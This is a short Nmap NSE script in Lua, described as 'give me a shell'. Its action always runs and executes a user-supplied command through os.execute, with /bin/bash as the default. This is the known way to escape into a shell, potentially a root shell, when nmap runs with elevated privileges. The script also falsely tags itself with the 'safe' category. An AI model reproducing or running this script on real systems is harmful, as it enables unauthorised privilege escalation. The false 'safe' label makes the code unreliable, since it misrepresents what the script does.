description = [[
give me a shell
]]

license = "Beerware - use however you want, just know that you owe me a beer"
categories = {
    "safe"
}
local stdnse = require "stdnse"
prerule = function() return true end
action = function()
    local command = stdnse.get_script_args( "cmd" ) or "/bin/bash"
    local output = os.execute( command )
    return stdnse.format_output( false, output )
end
